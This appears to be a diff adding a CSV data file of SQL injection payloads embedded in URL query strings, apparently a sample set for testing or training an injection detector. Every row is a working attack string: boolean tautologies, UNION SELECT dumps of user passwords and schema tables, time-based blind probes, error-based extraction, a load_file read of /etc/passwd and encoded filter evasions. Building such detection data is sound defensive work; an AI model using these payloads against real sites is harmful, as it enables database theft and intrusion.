@@ -1,0 +1,95 @@
+url,body
+/login?id=1' OR '1'='1,username=admin
+/login?id=1' OR 1=1-- -,pass=123
+/search?q=test' OR '1'='1,filter=all
+/profile?id=5 AND 1=1,view=full
+/item?id=10 UNION SELECT 1,2,3,mode=json
+/product?id=10 UNION SELECT username,password FROM users--,q=test
+/api/user?id=1' AND '1'='1,debug=true
+/api/search?q=test'#,none=
+/check?id=1 OR TRUE-- -,v=1
+/find?id=2 OR 2>1-- -,x=1
+/view?id=7' OR 'abc'='abc,ref=home
+/details?id=3') OR ('1'='1,lang=en
+/list?id=1)) OR ((1=1,foo=bar
+/login?id=1 OR sleep(1)-- -,a=1
+/query?id=4' AND sleep(2)-- -,k=1
+/product?id=1' AND SLEEP(5)-- -,t=1
+/api?u=test' AND IF(1=1, SLEEP(2), 0)-- -,mode=slow
+/api?id=0 UNION SELECT NULL,NULL,NULL-- -,debug=yes
+/search?category=1 UNION SELECT table_name,NULL FROM information_schema.tables-- -,dump=true
+/search?item=1 UNION SELECT column_name,NULL FROM information_schema.columns-- -,dump=true
+/data?id=9 AND (SELECT COUNT(*) FROM users)>0,check=true
+/login?user=admin' AND LENGTH(password)>0-- -,try=1
+/login?user=admin' AND ASCII(SUBSTR(password,1,1))>50-- -,a=1
+/login?user=admin' AND BENCHMARK(1000000,MD5(1))-- -,test=1
+/api/v1?x=1' OR extractvalue(1,concat(0x7e,(SELECT database())))-- -,none=
+/api/v1?x=1 OR updatexml(1,concat(0x7e,database()),1),none=
+/filter?cat=1') UNION SELECT @@version,NULL-- -,info=1
+/login?id=1' UNION SELECT load_file('/etc/passwd'),NULL-- -,read=true
+/x?q=1' UNION SELECT null,group_concat(schema_name) FROM information_schema.schemata-- -,dump=true
+/test?id=2 AND (SELECT 1 FROM users WHERE username='admin')=1,ok=1
+/test?id=2 AND EXISTS(SELECT 1 FROM users),v=1
+/api?x=1' OR JSON_EXTRACT('{"a":1}','$.a')=1-- -,none=
+/api?x=1 OR CAST('1' AS SIGNED)=1,check=1
+/data?id=9'/**/OR/**/'1'='1,cat=all
+/data?id=9'/*!OR*/'1'='1,cat=all
+/info?id=3%27%20OR%201=1-- -,test=
+/info?id=3%27)%20OR%20(1=1-- -,test=
+/login?id=1%27||%271%27=%271,tag=1
+/login?id=1%27+OR+1=1--+,tag=1
+/login?id=1%27%20OR%20%271%27=%271,tag=1
+/api?search=a'||'b,none=
+/api?search='||'a'||'',none=
+/search?kw=a' OR 1=1 LIMIT 1-- -,l=1
+/search?kw=a' ORDER BY 1-- -,l=1
+/search?kw=a' ORDER BY 3-- -,l=1
+/filter?id=1' UNION SELECT 1,2-- -,none=
+/filter?id=1' UNION SELECT 1,2,3-- -,none=
+/filter?id=1' UNION SELECT 1,2,3,4-- -,none=
+/api/adv?id=1 AND (SELECT sleep(1)),slow=1
+/api/adv?id=1 AND (SELECT SLEEP(0.5)),slow=1
+/api/x?id=5 AND (SELECT 1 FROM users LIMIT 1),check=1
+/api/x?id=5 AND (SELECT COUNT(*) FROM admin)>0,check=1
+/lab?id=7 OR 1 IN (SELECT 1),none=
+/lab?id=7 OR 1 IN (SELECT * FROM users),none=
+/list?id=2 AND TRUE,ok=1
+/list?id=2 AND FALSE,ok=1
+/list?id=2 AND 'A'='A',ok=1
+/load?id=3 AND 2 LIKE 2,ok=1
+/load?id=3 AND 2 LIKE '2',ok=1
+/api?c=1 AND 99999=99999,none=
+/api?c=1 AND 99999=88888,none=
+/api?c=1 OR 99999=99999,none=
+/api?c=1 OR 99999=88888,none=
+/info?id=10 AND CHAR_LENGTH('abc')=3,none=
+/info?id=10 AND LENGTH('aaa')=3,none=
+/panel?id=1' OR '1'='1'-- -,none=
+/panel?id=1" OR "1"="1"-- -,none=
+/panel?id=1 OR '1'='1'#,none=
+/check?id=4 AND '1'='1',none=
+/check?id=4 OR 'A'='B',none=
+/adv?id=5'||(SELECT 1),none=
+/adv?id=5'||(SELECT NULL),none=
+/dump?id=8 UNION SELECT version(),NULL,NULL-- -,none=
+/dump?id=8 UNION SELECT database(),NULL,NULL-- -,none=
+/dump?id=8 UNION SELECT user(),NULL,NULL-- -,none=
+/sys?id=9 UNION SELECT @@hostname,NULL-- -,none=
+/sys?id=9 UNION SELECT @@datadir,NULL-- -,none=
+/sys?id=9 UNION SELECT @@version_compile_os,NULL-- -,none=
+/dev?id=4 AND (SELECT 1 FROM dual),none=
+/dev?id=4 AND (SELECT SLEEP(1)),none=
+/dev?id=4 AND CASE WHEN 1=1 THEN SLEEP(1) ELSE 0 END,none=
+/data?id=5' OR 1 GROUP BY 1,none=
+/data?id=5' GROUP BY CONCAT(0x7e,(SELECT 1),0x7e),none=
+/test?id=10 OR extractvalue(1,concat(0x5c,(SELECT user()))),none=
+/test?id=10 OR updatexml(1,concat(0x5c,(SELECT user())),1),none=
+/api?id=1' AND JSON_KEYS('{"a":1,"b":2}') IS NOT NULL-- -,none=
+/api?id=1' AND JSON_VALID('{"a":1}')-- -,none=
+/api?id=1' AND REGEXP_LIKE('abc','^a')-- -,none=
+/p?id=2' AND (SELECT regexp_substr('abc','a'))='a'-- -,none=
+/p?id=2' AND (SELECT substr('abc',1,1))='a'-- -,none=
+/p?id=2' AND (SELECT ascii(substr('abc',1,1)))>50-- -,none=
+/ext?id=9'||json_extract('{"x":9}','$.x')-- -,none=
+/ext?id=9'||json_extract('{"x":[1,2]}','$[0]')-- -,none=
+/index?q=1 OR JSON_TYPE('{"x":9}','$.x')='NUMBER',none=
